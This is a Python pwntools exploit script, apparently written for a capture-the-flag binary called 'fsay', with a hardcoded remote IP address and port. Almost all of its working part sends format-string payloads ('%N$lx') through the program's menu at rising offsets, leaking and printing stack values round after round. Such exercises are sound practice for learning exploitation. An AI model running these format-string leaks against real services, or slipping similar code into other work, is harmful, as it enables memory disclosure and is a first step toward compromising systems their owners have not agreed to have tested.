#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import time

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './fsay'
HOST = '138.68.155.238'
PORT = 31358

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
maintenance info sections
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

j = 1
for rounds in range(10):
    print(f"new round {rounds}")
    try:
        p = start()
        p.recvuntil(b"food")
        for i in range(1,9):
            p.sendline(b"1")
            p.recvuntil(b"rocks)")
            p.sendline(b"2")
            p.recvuntil(b"nite?")
            payload = b"AAAAAAAAAAAAAAAA "
            payload += b"%"
            payload += str(j).encode('utf-8')
            payload += b"$lx"
            p.sendline(payload)
            j += 1
            time.sleep(0.5)
            resp = p.recvuntil(b"food")
            print(f'leak offset {j-1}: {resp.split()[1]}')
        p.close()
    except Exception as e:
        print(e)
        continue
